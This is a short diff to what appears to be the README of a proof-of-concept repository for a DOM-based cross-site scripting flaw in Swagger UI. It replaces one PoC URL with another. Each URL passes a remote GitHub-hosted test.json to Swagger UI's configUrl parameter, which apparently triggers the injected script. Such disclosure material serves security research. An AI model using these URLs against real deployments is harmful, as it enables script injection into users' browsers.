@@ -4,4 +4,5 @@ This project is shared with the intention of being used for positive and product
 
 PoC:
 
-https://website/swagger-ui.html?configUrl=https://raw.githubusercontent.com/mtkilicc/PoC-of-Swagger-UI-DOM-XSSS/main/test.json
+
+https://website/swagger-ui.html?configUrl=https://raw.githubusercontent.com/cyberstruggle/PoC-Swagger-UI-DOM-XSS/main/test.json
